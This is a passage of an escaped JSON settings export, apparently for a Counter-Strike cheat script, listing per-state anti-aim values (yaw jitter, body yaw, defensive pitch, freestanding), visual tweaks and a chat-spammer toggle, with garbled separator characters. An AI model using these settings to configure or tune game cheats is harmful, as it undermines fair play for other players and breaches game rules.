":1,""1.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF001"",""1.defensive_yaw"":false,""3.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF003"",""viewmodel_vertical"":0,""8.defensive_yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF008"",""13.yaw_jitter_type"":""Offset"",""7.defensive_yaw"":false,""9.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF009"",""1.defensive_yaw_jitter_offset"":0,""12.defensive_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0012"",""5.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF005"",""5.bombsite_fix"":false,""5.defensive_pitch_offset2"":0,""5.pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF005"",""3.defensive_pitch_offset2"":0,""7.defensive_yaw_jitter_offset"":0,""9.pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF009"",""5.defensive_yaw_jitter_offset"":0,""10.defensive_pitch_offset2"":0,""6.defensive_pitch_variance"":0,""8.defensive_pitch_variance"":0,""13.yaw_offset"":0,""12.yaw_jitter_offset"":0,""10.defensive_pitch_type"":""Switch"",""3.pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF003"",""4.yaw_jitter_type"":""Offset"",""7.pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF007"",""1.pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF001"",""2.defensive_pitch_variance"":0,""10.defensive_yaw"":false,""4.defensive_pitch_variance"":0,""10.defensive_yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0010"",""1.freestanding"":false,""2.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF002"",""7.freestanding"":false,""4.defensive_pitch_offset2"":0,""5.freestanding"":false,""1.defensive_pitch_offset1"":0,""1.yaw_jitter_right"":0,""10.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0010"",""2.yaw_jitter_left"":0,""10.body_yaw"":""Off"",""5.defensive_yaw_jitter_delay"":1,""12.defensive_pitch_type"":""Switch"",""9.defensive_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF009"",""2.yaw_offset"":0,""3.freestanding"":false,""12.defensive_yaw"":false,""10.defensive_yaw_jitter_delay"":1,""12.yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0012"",""9.yaw_jitter_left"":0,""3.defensive_yaw_jitter_delay"":1,""9.defensive_yaw_delay"":1,""2.defensive_angles_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF002"",""9.yaw_jitter_delay"":1,""9.yaw_jitter_right"":0,""13.yaw_left"":0,""9.defensive_yaw_jitter_right"":0,""13.yaw_jitter_right"":0,""11.yaw_base"":""At targets"",""6.yaw_jitter_type"":""Offset"",""9.defensive_yaw_jitter_delay"":1,""1.yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF001"",""6.defensive_yaw_jitter1"":false,""3.yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF003"",""4.yaw_jitter_left"":0,""12.defensive_yaw_jitter_type"":""Offset"",""5.defensive_yaw"":false,""7.yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF007"",""8.yaw_jitter_left"":0,""4.yaw_jitter_right"":0,""9.defensive_yaw"":false,""2.yaw_jitter_right"":0,""5.defensive_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF005"",""8.yaw_jitter_right"":0,""3.defensive_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF003"",""6.yaw_jitter_right"":0,""12.force_defensive"":false,""2.yaw_jitter"":""Center"",""1.yaw_offset"":0,""9.freestanding"":false,""6.defensive_angles_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF006"",""8.yaw_jitter_type"":""Offset"",""4.defensive_angles_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF004"",""filter_console"":true,""2.defensive_pitch"":false,""4.pitch_offset"":0,""9.yaw_offset"":0,""7.defensive_angles_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF007"",""fps_boost_triggers"":{},""13.yaw_jitter_left"":0,""12.freestanding"":false,""8.body_yaw_offset"":0,""12.defensive_pitch_variance"":0,""7.yaw_right"":12,""7.defensive_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF007"",""10.defensive_pitch_offset"":0,""5.defensive_pitch_offset"":0,""2.defensive_pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF002"",""3.defensive_pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF003"",""13.separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0013"",""3.defensive_pitch_offset1"":0,""4.defensive_yaw_delay"":1,""8.defensive_yaw_jitter_offset"":0,""8.defensive_yaw_jitter_variance"":0,""8.defensive_angles_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF008"",""7.defensive_yaw_jitter_left"":0,""2.defensive_pitch_delay"":1,""10.defensive_yaw_jitter2"":""Off"",""manual_yaw"":true,""5.yaw_left"":-10,""safe_head"":true,""roll"":false,""11.defensive_angles_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0011"",""1.pitch_offset"":0,""2.defensive_yaw_type"":""Random"",""7.override"":true,""10.defensive_yaw_jitter_variance"":0,""9.override"":false,""drop_grenades_selection"":[""HE"",""Molotov""],""improvements"":true,""3.yaw_jitter"":""Center"",""5.override"":true,""8.body_yaw"":""Off"",""10.defensive_yaw_jitter_offset"":0,""better_scope_overlay_size"":60,""chat_spammer"":false,""4.defensive_yaw"":false,""7.yaw"":""Left \/ Right"",""7.yaw_offset"":0,""11.defensive_pitch_delay"":1,""6.defensive_yaw_offset"":180,""9.defensive_yaw_jitter_left"":0,""4.defensive_yaw_jitter_variance"":0,""11.yaw_delay"":1,""2.defensive_yaw_offset"":180,""3.override"":true,""8.pitch_offset"":0,""9.yaw_left"":0,""5.yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF005"",""7.yaw_left"":-3,""6.yaw_delay"":1,""13.defensive_pitch"":false,""2.body_yaw_offset"":99,""6.defensive_pitch_type"":""Switch"",""1.yaw_right"":0,""1.yaw_left"":0,""7.bombsite_fix"":false,""7.body_yaw"":""Jitter"",""6.yaw_offset"":0,""4.yaw_jitter_offset"":57,""6.yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF006"",""10.defensive_yaw_type"":""Random"",""10.yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0010"",""animations_legs_on_ground"":""Off"",""5.defensive_yaw_offset"":180,""1.defensive_yaw_jitter2"":""Off"",""fast_ladder"":false,""6.yaw_jitter_left"":0,""12.yaw_jitter_left"":0,""7.defensive_yaw_jitter1"":false,""1.defensive_pitch"":false,""10.defensive_yaw_offset"":180,""12.defensive_pitch_delay"":1,""12.defensive_angles_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0012"",""12.yaw_jitter_variance"":0,""1.defensive_pitch_delay"":1,""3.defensive_pitch"":false,""animations_body"":""Off"",""shadows_pitch"":25,""3.body_yaw"":""Jitter"",""7.defensive_pitch"":false,""6.defensive_yaw_jitter_offset"":0,""6.yaw_right"":0,""4.defensive_yaw_jitter2"":""Off"",""11.defensive_yaw_jitter_left"":0,""2.defensive_yaw_delay"":1,""better_scope_overlay"":true,""11.defensive_yaw_jitter_offset"":0,""6.defensive_yaw_jitter_delay"":1,""1.defensive_yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF001"",""animations"":false,""1.defensive_pitch_offset"":0,""11.defensive_yaw_jitter_delay"":1,""9.yaw"":""Off"",""12.defensive_yaw_variance"":0,""10.yaw"":""Off"",""3.bombsite_fix"":false,""3.defensive_pitch_offset"":0,""13.defensive_pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0013"",""12.yaw_variance"":0,""5.defensive_yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF005"",""3.defensive_pitch_delay"":1,""6.body_yaw"":""Off"",""5.defensive_pitch_delay"":1,""1.defensive_pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF001"",""5.defensive_pitch_offset1"":0,""7.pitch"":""Down"",""1.defensive_yaw_jitter_right"":0,""11.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0011"",""5.defensive_yaw_jitter_left"":0,""7.defensive_pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF007"",""8.defensive_yaw_delay"":1,""9.defensive_pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF009"",""6.defensive_yaw_delay"":1,""8.defensive_yaw_type"":""Random"",""9.defensive_pitch_offset"":0,""6.defensive_yaw_type"":""Random"",""7.defensive_pitch_offset"":0,""4.defensive_yaw_type"":""Random"",""7.defensive_pitch_offset2"":0,""8.defensive_pitch_offset2"":0,""4.pitch"":""Down"",""4.defensive_pitch_delay"":1,""1.defensive_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF001"",""8.defensive_yaw_jitter_type"":""Offset"",""9.defensive_pitch_offset1"":0,""8.defensive_yaw_variance"":0,""7.defensive_pitch_offset1"":0,""2.yaw_delay"":1,""11.defensive_yaw_delay"":1,""11.yaw_jitter_type"":""Offset"",""11.defensive_angles"":false,""5.yaw_offset"":0,""9.body_yaw"":""Off"",""6.pitch"":""Off"",""3.pitch_offset"":0,""11.separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0011"",""5.body_yaw"":""Jitter"",""12.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0012"",""4.yaw_variance"":0,""2.defensive_yaw_jitter_type"":""Offset"",""1.body_yaw"":""Off"",""4.defensive_yaw_jitter_type"":""Offset"",""3.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF003"",""6.defensive_yaw_variance"":0,""10.defensive_yaw_jitter_right"":0,""11.pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0011"",""6.bombsite_fix"":false,""6.defensive_yaw_jitter_variance"":0,""6.yaw_variance"":0,""6.yaw_jitter_delay"":1,""11.override"":true,""7.defensive_pitch_delay"":1,""2.yaw_jitter_delay"":1,""4.defensive_yaw_variance"":0,""aspect_ratio_offset"":160,""13.defensive_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0013"",""5.pitch_offset"":0,""11.yaw_jitter_left"":0,""11.defensive_yaw_jitter1"":false,""4.defensive_yaw_offset"":180,""1.defensive_yaw_jitter_left"":0,""4.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF004"",""3.defensive_yaw_jitter_left"":0,""2.body_yaw"":""Jitter"",""viewmodel_field_of_view"":680,""7.defensive_angles"":false,""13.defensive_yaw"":false,""4.yaw_jitter"":""Center"",""7.yaw_jitter_left"":0,""8.defensive_yaw_jitter_right"":0,""7.yaw_variance"":0,""11.yaw_jitter_offset"":0,""9.pitch"":""Off"",""5.yaw"":""Left \/ Right"",""1.pitch"":""Off"",""5.yaw_delay"":1,""8.defensive_pitch"":false,""9.yaw_jitter_type"":""Offset"",""6.defensive_yaw_jitter_type"":""Offset"",""11.defensive_pitch_offset1"":0,""11.defensive_pitch_type"":""Switch"",""animations_landing_pitch"":false,""11.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0011"",""10.yaw_jitter_type"":""Offset"",""8.yaw_base"":""Local view"",""4.defensive_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF004"",""1.defensive_angles"":false,""10.yaw_offset"":0,""10.yaw_jitter"":""Off"",""11.yaw_jitter"":""Off"",""9.defensive_yaw_jitter_variance"":0,""6.yaw_base"":""Local view"",""13.bombsite_fix"":true,""4.yaw_base"":""At targets"",""10.defensive_pitch_delay"":1,""2.yaw_base"":""At targets"",""10.pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0010"",""4.defensive_yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF004"",""1.defensive_yaw_jitter_variance"":0,""4.defensive_yaw_jitter1"":false,""10.yaw_jitter_right"":0,""10.override"":false,""9.defensive_angles"":false,""2.yaw"":""Left \/ Right"",""11.defensive_yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0011"",""7.defensive_yaw_jitter_delay"":1,""1.defensive_yaw_jitter_delay"":1,""5.defensive_yaw_jitter1"":false,""7.defensive_yaw_jitter_variance"":0,""8.yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF008"",""5.defensive_yaw_jitter_variance"":0,""11.yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0011"",""2.yaw_jitter_offset"":45,""12.yaw_left"":0,""8.yaw_jitter_offset"":0,""6.yaw_jitter_offset"":0,""10.yaw_base"":""Local view"",""8.override"":false,""8.defensive_yaw"":false,""viewmodel_adjustment"":false,""3.yaw_offset"":0,""3.yaw_jitter_left"":36,""13.pitch_offset"":0,""4.defensive_yaw_jitter_delay"":1,""4.yaw_jitter_variance"":11,""7.defensive_yaw_offset"":180,""9.pitch_offset"":0,""9.defensive_yaw_offset"":180,""3.defensive_yaw_jitter_variance"":0,""3.defensive_yaw_offset"":180,""2.yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF002"",""10.defensive_angles"":false,""10.bombsite_fix"":false,""10.pitch_offset"":0,""10.force_defensive"":false,""13.force_defensive"":false,""11.defensive_yaw_jitter_type"":""Offset"",""12.yaw_jitter_delay"":1,""freestanding_disablers"":[""Slow motion"",""In air""],""12.defensive_pitch_offset1"":0,""10.yaw_jitter_variance"":0,""3.defensive_angles"":false,""4.defensive_pitch"":false,""5.defensive_angles"":false,""12.pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0012"",""7.yaw_delay"":1,""shadows"":false,""animations_sliding"":{},""11.defensive_pitch_offset2"":0,""3.yaw_delay"":1,""11.defensive_yaw_jitter_right"":0,""13.defensive_pitch_variance"":0,""11.yaw_jitter_delay"":1,""11.yaw_right"":0,""8.yaw_variance"":0,""3.force_defensive"":false,""11.pitch"":""Down"",""5.pitch"":""Down"",""11.defensive_pitch_offset"":0,""12.body_yaw_offset"":0,""11.body_yaw_offset"":0,""4.yaw"":""Left \/ Right"",""viewmodel_opposite_knife_hand"":false,""11.defensive_yaw"":false,""2.defensive_yaw_variance"":0,""7.pitch_offset"":0,""11.pitch_offset"":0,""1.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF001"",""5.defensive_pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF005"",""9.yaw_right"":0,""11.defensive_yaw_jitter2"":""Off"",""11.bombsite_fix"":false,""10.pitch"":""Off"",""5.yaw_right"":14,""11.yaw_left"":0,""9.yaw_delay"":1,""12.yaw_right"":0,""11.freestanding"":true,""12.pitch_offset"":0,""3.defensive_yaw"":false,""9.force_defensive"":false,""7.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF007"",""2.yaw_jitter_variance"":23,""1.yaw_delay"":1,""3.pitch"":""Down"",""1.defensive_pitch_offset2"":0,""6.defensive_yaw_jitter2"":""Off"",""5.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF005"",""8.defensive_yaw_jitter2"":""Off"",""3.body_yaw_offset"":-59,""2.defensive_yaw_jitter2"":""Off"",""9.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF009"",""12.yaw_delay"":1,""viewmodel_height"":-15,""2.defensive_yaw_jitter1"":false,""11.defensive_yaw_jitter_variance"":0,""8.defensive_pitch_type"":""Switch"",""shadows_yaw"":-55,""13.defensive_yaw_jitter_offset"":0,""7.defensive_yaw_jitter2"":""Off"",""4.defensive_pitch_type"":""Switch"",""13.yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0013"",""animations_legs_in_air"":""Off"",""1.yaw"":""Off"",""8.yaw_right"":0,""6.defensive_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF006"",""better_scope_overlay_gap"":15,""12.yaw_jitter"":""Off"",""2.yaw_jitter_type"":""Offset"",""4.body_yaw_offset"":-82,""13.body_yaw"":""Off"",""7.yaw_jitter"":""Center"",""10.defensive_pitch"":false,""1.yaw_jitter"":""Off"",""2.defensive_pitch_type"":""Switch"",""3.yaw_right"":18,""2.defensive_yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF002"",""5.yaw_jitter"":""Center"",""13.defensive_yaw_type"":""Random"",""11.yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0011"",""6.defensive_yaw_jitter_separator"":""\u00